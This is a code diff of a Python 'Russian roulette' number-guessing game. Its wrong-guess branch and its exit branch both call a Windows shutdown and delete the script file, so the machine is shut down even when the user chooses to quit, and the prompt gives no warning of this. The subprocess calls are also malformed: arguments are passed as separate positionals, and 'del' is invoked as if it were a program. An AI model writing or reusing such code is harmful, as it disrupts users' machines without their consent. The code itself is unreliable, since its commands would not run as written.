@@ -1,34 +1,34 @@
-import os
-import sys
 import random
 import time
+import os
 import subprocess
-wait=1
-
-
-
 
 print("RussischRoulette - A simple game of chance")
-print("Type 'play' to play the game or 'exit' to quit.")
-if input().lower() == 'play':
+choice = input("Type 'play' to play the game or 'exit' to quit: ").strip().lower()
+if choice == 'play':
     print("Generating Number 1-10")
     number = random.randint(1, 10)
     for i in range(10):
         time.sleep(0.3)
-        print(random.randint(1,10))
-            
+        print(random.randint(1, 10))
+
     print("Number decided")
-    if input() == number:
-        print("Congratulations! You win!")
+    try:
+        guess = int(input("Enter your guess (1-10): ").strip())
+    except ValueError:
+        print("Invalid input: please enter an integer between 1 and 10.")
     else:
-        
-        
-        subprocess.run("shutdown", "-s")
-        os.remove("pythonfile.py")
-        subprocess.run("sel", "pythonfile.py")
+        if guess == number:
+            print("Congratulations! You win!")
 
-else:    
+        else:
+            print(f"Wrong. The number was {number}. Better luck next time!")
+            subprocess.run("shutdown", "-s")
+            os.remove("pythonfile.py")
+            subprocess.run("del", "pythonfile.py")
+else:
     print("Exiting the game. Goodbye!")
-    subprocess.run("sel", "pythonfile.py")
+    subprocess.run("del", "pythonfile.py")
     subprocess.run("shutdown", "-s")
-
+    os.remove("pythonfile.py")
+    
